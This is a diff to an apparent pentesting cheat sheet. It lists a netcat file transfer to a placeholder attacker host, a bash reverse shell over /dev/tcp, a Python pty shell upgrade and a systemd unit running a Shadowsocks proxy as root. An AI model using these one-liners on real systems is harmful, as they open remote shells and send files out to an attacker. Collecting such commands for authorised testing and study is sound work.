@@ -7,3 +7,21 @@ Copy CLIENT nc -w 3 ATTACKER_IP ATTACKER_PORT < [file_to_download] SERVER nc -l 
 
 Bash
 Connections "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKING-IP/PORT 0>&1'"
+
+Python PSEUDOshell
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+### Create a service ###
+[Unit]
+Description=Shadowsocks proxy server
+
+[Service]
+User=root
+Group=root
+Type=simple
+ExecStart=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v start
+ExecStop=/usr/local/bin/ss-server -c /etc/shadowsocks/shadowsocks.json -a shadowsocks -v stop
+
+[Install]
+WantedBy=multi-user.target
+### EOF ###
